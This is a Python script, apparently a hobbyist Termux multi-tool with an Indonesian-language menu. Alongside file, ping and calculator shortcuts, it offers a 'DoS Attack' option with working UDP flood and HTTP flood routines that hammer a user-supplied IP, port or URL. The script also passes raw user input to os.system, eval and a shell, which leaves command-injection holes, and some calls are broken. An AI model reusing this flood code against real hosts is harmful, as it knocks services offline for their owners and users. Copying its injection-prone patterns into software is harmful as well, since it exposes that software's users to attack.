import os
import subprocess
import colorama
import numpy as np
import socket
import random
import threading
import time
import requests
from colorama import Fore, Style

colorama.init(autoreset=True)

shortcuts = {
    "1": "apt update && apt upgrade -y",
    "2": "clear",
    "3": "ls",
    "4": "exit",
    "5": "nano",
    "6": "vim",
    "7": "curl ipconfig.me",
    "8": "df -h",
    "9": "top",
    "10": "termux-battery-status",
}

def show_menu():
    os.system("clear")
    print(f"{Fore.CYAN}=== Key X Amosr ==={Style.RESET_ALL}")
    print(f"{Fore.GREEN}Terminal multi fungsi - pilih angka untuk fitur cepat:\n")
    print(f"""{Fore.YELLOW}
          1 > Update termux
          2 > Bersihkan layar
          3 > List daftar file
          4 > Keluar
          5 > Edit file dengan nano
          6 > Edit file dengan vim
          7 > Cek IP Publik
          8 > cek Penyimpanan
          9 > Monitor CPU & RAM
          10 > Cek status baterai
          11 > Download file
          12 > Buat Folder
          13 > Buat File
          14 > Kalkulator
          15 > Ping ke server
          16 > Kalkulator matrix
          17 > DoS Attack
{Style.RESET_ALL}""")

def udp_flood(ip, port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) 
    bytes = random._urandom(1024)

    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"{Fore.RED}mengirim paket ke {ip}:{port} ({sent} paket yang terkirim){Style.RESET_ALL}")

def http_flood(target_url, duration):
    timeout = time.time() + duration
    sent = 0

    while time.time() < timeout:
        try:
            response = requests.get(target_url)
            sent += 1
            print(f"{Fore.RED}mengirim request ke {target_url} ({sent} request) - Status: {response.status_code}{Style.RESET_ALL}")
        except requests.exceptions.RequestException:
            print(f"{Fore.RED}Gagal mengirim request ke {target_url}{Style.RESET_ALL}")

def DoS_Attack():
    print(f"""{Fore.GREEN}
    1 > UDP Flood Attack
    2 > HTTP Flood Attack
    3 > Kembali ke menu
    {Style.RESET_ALL}""")

    choice = input("Pilih jenis serangan DoS: ")

    if choice == "1":
        ip = input("Masukkan IP target: ")
        port = int(input("Masukkan Port: "))
        duration = int(input("Masukkan Durasi: "))
        print(f"{Fore.RED}memulai serangan UDP Flood ke {ip}:{port} selama {duration} detik...{Style.RESET_ALL}")

        thread = threading.Thread(target=udp_flood, args=(ip, port, duration))
        thread.start()

    elif choice == "2":
        target_url = input("Masukkan URL target: ")
        duration = int(input("Masukkan Durasi: (detik) "))
        print(f"{Fore.RED}memulai serangan HTTP Flood ke {target_url} selama {duration} detik...{Style.RESET_ALL}")

        thread = threading.Thread(target=http_flood, args=(target_url, duration))
        thread.start()

    elif choice == "3":
        return

    else:
        print(f"{Fore.RED}Pilihan tidak valid{Style.RESET_ALL}")

def main():
    while True:
        show_menu()
        command = input(f"{Fore.BLUE}Termux >> {Style.RESET_ALL}").strip()

        if command in shortcuts:
            os.system(shortcuts[command])
        elif command == "11":
            url = input("Masukkan URL file: ")
            os.system(f"wget {url}")
            print(f"{Fore.GREEN}File berhasil diunduh ke direktori saat ini.{Style.RESET_ALL}")
        elif command == "12":
            folder_name = input("Masukkan nama folder: ")
            os.mkdir(folder_name, exist_ok=True)
            print(f"{Fore.GREEN}Folder {folder_name} berhasil dibuat.{Style.RESET_ALL}")
        elif command == "13":
            file_name = input("Masukkan nama file (dengan ekstensi): ")
            os.system(f"touch {file_name}")
            print(f"{Fore.GREEN}File {file_name} berhasil dibuat.{Style.RESET_ALL}")
        elif command == "14":
            expression = input("Masukkan operasi matematika: ")
            try:
                result = eval(expression)
                print(f"{Fore.GREEN}Hasil: {result}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        elif command == "15":
            target = input("Masukkan alamat server: ")
            os.system(f"ping -c 4 {target}")
        elif command == "16":
            print(f"{Fore.YELLOW}fitur kalkulator matriks akan ditambahkan...{Style.RESET_ALL}")
        elif command == "17":
            DoS_Attack()
        elif command in ["exit", "quit"]:
            print(f"{Fore.RED}Keluar dari program...{Style.RESET_ALL}")
            break
        else:
            subprocess.run(command, shell=True)

if __name__ == "__main__":
    main()
